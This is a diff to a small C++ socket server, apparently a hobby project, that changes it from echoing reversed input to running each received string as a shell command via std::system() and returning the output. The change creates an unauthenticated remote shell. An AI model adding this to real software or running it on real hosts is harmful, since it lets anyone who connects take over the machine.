@@ -1,9 +1,12 @@
 #include <iostream>
+#include <fstream>
+#include <cstdlib>
+#include <string>
 #include "socks.hpp"
 
 #define DEFAULT_PORT "27016"
 #define BUFFER_SIZE 512
-#define DEBUG
+//#define DEBUG
 
 using std::cin, std::cout, std::cerr, std::endl;
 
@@ -115,19 +118,20 @@ int main() {
         cout << "received " << result << " bytes" << endl;
         #endif
 
-        int size = result / sizeof(char);
-        for (int i = 0; i < size; i++) {
-            cout << buffer[i];
-        }
-        cout << endl;
+        std::string command(buffer);
+        cout << command << endl;
+        command = "(" + command + ") > .temp 2>&1";
+        std::system(command.c_str());
 
-        for (int i = 0; i <= size / 2; i++) {
-            auto t = buffer[i];
-            buffer[i] = buffer[size - i - 1];
-            buffer[size - i - 1] = t;
-        }
+        std::ifstream file;
+        file.open(".temp");
 
-        result = socks::cend(shoeket, buffer, size);
+        std::string content;
+        content.assign((std::istreambuf_iterator<char>(file)), (std::istreambuf_iterator<char>()));
+
+        file.close();
+
+        result = socks::cend(shoeket, content.c_str(), content.size() + 1);
         if (result == socks::error) {
             cerr << "socks::cend failed with error " << socks::lastError() << endl;
             socks::close(shoeket);
@@ -140,12 +144,17 @@ int main() {
         }
 
         #ifdef DEBUG
-        cout << "sent " << result << " bytes out of " << strlen(buffer) + 1 << endl;
+        cout << "sent " << result << " bytes out of " << content.size() + 1 << endl;
         #endif
     }
+
+    std::remove(".temp");
 
     socks::close(shoeket);
     socks::drop();
 
     return 0;
+}
+
+void thingy() {
 }
